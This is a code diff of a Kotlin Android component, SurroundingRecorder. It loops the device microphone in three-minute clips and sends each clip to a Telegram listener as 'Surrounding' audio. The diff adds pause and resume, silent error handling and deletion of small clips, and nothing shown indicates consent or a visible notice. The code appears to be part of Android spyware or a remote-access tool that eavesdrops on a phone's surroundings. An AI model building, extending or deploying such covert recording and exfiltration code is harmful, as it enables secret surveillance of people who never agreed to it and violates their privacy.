@@ -13,37 +13,55 @@ import java.util.*
 object SurroundingRecorder {
 
     private const val TAG = "SurroundingRecorder"
-    private const val CLIP_DURATION_MS = 3 * 60 * 1000L // 3 minutes
+    private const val CLIP_MS = 3 * 60 * 1000L
 
     private var recorder: MediaRecorder? = null
     private var currentFile: File? = null
     private var running = false
+    private var paused = false
+    private var appContext: Context? = null
     private val handler = Handler(Looper.getMainLooper())
 
     fun start(context: Context) {
         if (running) return
+        appContext = context.applicationContext
         running = true
-        cycle(context)
+        cycle()
     }
 
-    private fun cycle(context: Context) {
-        startClip(context)
+    fun pause() {
+        if (paused) return
+        paused = true
+        handler.removeCallbacksAndMessages(null)
+        stopClipSilently()
+    }
+
+    fun resume() {
+        if (!running || !paused) return
+        paused = false
+        cycle()
+    }
+
+    private fun cycle() {
+        if (!running || paused) return
+        startClip()
         handler.postDelayed({
-            stopAndSend()
-            if (running) cycle(context)
-        }, CLIP_DURATION_MS)
+            if (!paused) {
+                stopAndSend()
+                cycle()
+            }
+        }, CLIP_MS)
     }
 
-    private fun startClip(context: Context) {
+    private fun startClip() {
+        val ctx = appContext ?: return
         try {
-            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
-            currentFile = File(context.cacheDir, "surround_$timestamp.mp3")
+            val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
+            currentFile = File(ctx.cacheDir, "surround_$ts.mp4")
 
-            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                MediaRecorder(context)
-            } else {
-                @Suppress("DEPRECATION") MediaRecorder()
-            }
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                MediaRecorder(ctx)
+            else @Suppress("DEPRECATION") MediaRecorder()
 
             recorder?.apply {
                 setAudioSource(MediaRecorder.AudioSource.MIC)
@@ -51,11 +69,10 @@ object SurroundingRecorder {
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                 setAudioSamplingRate(44100)
                 setAudioEncodingBitRate(96000)
-                setOutputFile(currentFile?.absolutePath)
+                setOutputFile(currentFile!!.absolutePath)
                 prepare()
                 start()
             }
-            Log.d(TAG, "Clip started: ${currentFile?.name}")
         } catch (e: Exception) {
             Log.e(TAG, "startClip error: ${e.message}")
         }
@@ -64,19 +81,21 @@ object SurroundingRecorder {
     private fun stopAndSend() {
         try {
             recorder?.apply { stop(); release() }
-            recorder = null
-
-            currentFile?.let { file ->
-                if (file.exists() && file.length() > 1024) {
-                    TelegramListener.instance.sendAudio(
-                        file.absolutePath,
-                        "🎙️ Surrounding — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
-                    )
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "stopAndSend error: ${e.message}")
+        } catch (e: Exception) {}
+        recorder = null
+        currentFile?.let { file ->
+            if (file.exists() && file.length() > 2048) {
+                val ts = SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())
+                TelegramListener.instance.sendAudio(file.absolutePath, "🎙️ Surrounding — $ts")
+            } else file.delete()
         }
+    }
+
+    private fun stopClipSilently() {
+        try { recorder?.apply { stop(); release() } } catch (e: Exception) {}
+        recorder = null
+        currentFile?.delete()
+        currentFile = null
     }
 
     fun stop() {
